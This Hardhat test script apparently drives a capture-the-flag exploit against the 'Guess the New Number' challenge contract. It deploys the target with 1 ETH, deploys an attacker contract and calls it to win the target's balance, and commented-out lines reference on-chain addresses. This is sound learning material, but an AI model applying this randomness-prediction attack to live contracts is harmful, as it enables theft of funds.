import { time, loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
import { expect } from "chai";
import { ethers, tracer } from "hardhat";

let one_eth = ethers.utils.parseEther('1.0')

async function attackNewNumber() {
	tracer.enabled = false
	/*
	let target = new ethers.Contract(
		'0xfd4Aa751C7083F444eBF07822a3Ad98a97c40Cba',
		[
			'function guess(uint8 n) public payable',
            'function isComplete() public view returns (bool)' 
        ], signer                          
    )                                      
	*/
	let targetFactory = await ethers.getContractFactory('GuessTheNewNumberChallenge')
	let target = await targetFactory.deploy({ value: one_eth })
    let attackFactory = await ethers.getContractFactory('AttackNewNumber')
    let attack = await attackFactory.deploy(target.address)
    //let attack = attackFactory.attach('0xA25b90b7Ee6BaB71e25F80cd75CF7EAAF02Bc2E8')
    console.log('attecker deployed at ', attack.address)
    console.log('target bal before attack: ', 
                await ethers.provider.getBalance(target.address))
    tracer.enabled = true                  
    let tx = await attack.attempt(31, { gasLimit: 150_000, value: one_eth })
    console.log(tx)                        
    return target                          
}                                          

describe("Lock", function () {
	it('does', async()=>{
		await attackNewNumber()

	})
});
